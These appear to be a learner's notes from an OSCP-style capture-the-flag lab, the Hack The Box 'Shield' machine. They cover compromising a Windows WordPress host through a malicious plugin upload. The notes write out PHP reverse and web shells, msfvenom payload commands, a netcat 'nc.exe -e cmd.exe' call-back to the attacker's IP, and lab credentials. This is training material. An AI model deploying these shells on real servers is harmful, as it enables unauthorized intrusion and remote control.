port 80 doesnt really show anything, probably need to work on enumeration for this
port 80 just looks like a default iis server page

looks like there is a wordpress directory -> will need to gobuster this, also run wp-scan on it

when trying to connect to mysql server, keep getting an error that the host is not allowed to connect to the server
- looking into this more, this typically means its checking that you are root and are coming from localhost
- maybe way to bypass?

going through wpscan we see a few things, one of them is the xmlrpc.php

going through the entire list we dont see many things that are exploitable

take a look at the walkthrough, you are supposed to use the password from the postgres user, which doesnt make sense, but ya know
admin:P@s5w0rd!

Looking at hacktricks wordpress, it gives us a hint at what to do now that we have admin access

`<?php $sock=fsockopen("10.10.14.42",6000);exec("/bin/sh -i <&3 >&3 2>&3"); ?>`

Recieved the connection, but seems like that process might be terminated

going ahead and trying pentestmonkey's php reverse shell
- didnt work cause machine is windows... duh

Taking a look at this one -> https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php
- that didnt work, but not sure what was up with that, will need to take a look at that one later

Goind to just go with the basics

`<?php echo exec($_GET['cmd']); ?>`

showing we have some RCE

Now we need to figure out a good way to get a shell, which is where my knowledge of windows reverse shell is very weak

Need to lookup "wordpress php windows reverse shell", get a really good guide for wordpress shell uploads
- https://www.hacknos.com/wordpress-shell-upload/

Also msfvenom is allowed for the oscp, so time to learn that
`./msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.42 LPORT=6000 -f raw -o ~/Documents/oscp-notes/htb/startpoint/Shield/shell.php`

Used to create a php reverse shell

Tried uploading both theme and plugins
- went to `/wp-content/uploads/year/month/shell.php` didnt work
- went to `/wp-content/uploads/shell.php` and that did the trick

Note: the setting for this was found in the wordpress admin page settings > media, there is a little box at the bottom that lets you choose if you add the month/day to the filepath

got connection, but cant seem to execute commands

Taking a look at the writeup, they use msfconsole to create a shell and execute it on the machine
- Dont really want to rely on msf so I'll take a look at what its doing differently and why I cant get a reverse shell for some reason
- found this link how how to make a proper wp plugin -> https://www.wpexplorer.com/writing-simple-wordpress-plugin/
- looks like when i tried to upload my shell earlier as a plugin, I was missing the header comments, cause now it works

So when I activate it, it still doesnt really print any thing, Im getting a connection, but cant seem to communicate with the shell??

Just going to go ahead and use my basic rce to try and get a more stable shell

Possibly try uploading a staged reverse shell for windows through the theme or plugin generator, then try and execute that through the small rce you got

Note: When using curl, good option is to se --data-urlencode to url encode query string
- i.e. `curl -G "http://10.10.10.29/wordpress/index.php/2020/02/11/cyberpunk-truck/" --data-urlencode "cmd=dir wp-content\uploads"`
- did this to read out the upload files
- had rce, just needed to do:

`nc.exe -e cmd.exe 10.10.14.42 6000`

nc.exe can be uploaded through themes or plugins

Thoughts:
- https://hakluke.medium.com/haklukes-guide-to-hacking-without-metasploit-1bbbe3d14f901
- https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/

The reason msfvenom payloads did not work was because it was a mertepreter shell, not a normal shell
Also the cheat sheet most likely failed because I was using /bin/sh not cmd.exe
nc -e means execuatble for some netcat versions

Go ahead and create our our msfvenom payload
`~/apps/metasploit-framework/msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.42 LPORT=6000 -f exe > reverse.exe`

Go through the task of -> uploading reverse shell through themes, check that it got uploaded through our small rce we got using curl, execute the reverse shell

Shit - that was it, I was using mertepreter, using a normal shell worked well

Lets go ahead and get winpeas now

Using `systeminfo` we see the server is: Microsoft Windows Server 2016 Standard v. 10.0.14393 N/A Build 14393

we also see that if is "x64-based PC", so we know which winpeas to use

lets go ahead and try that http simple server trick to transfer a file
`python3 -m http.server 8080` -> execute this in the directory of winpeas
however we know it works because if we go to -> localhost:8080/winPEASx64.exe, we can download it, should test this on another box

welp windows did not have that

running winpeas, which another thing to learn -> how to do windows priv esc

Seems to be a few vulnerabilities -> https://www.rythmstick.net/posts/cve-2019-1064/

also the logged in users
SHIELD\Administrator
MEGACORP\sandra

winpeas found some credentials from wordpress
wordpressuser124:P_-U9dA6q.B|
under the database wordpress124

auto login creds for sandra was found? doesnt show the password tho
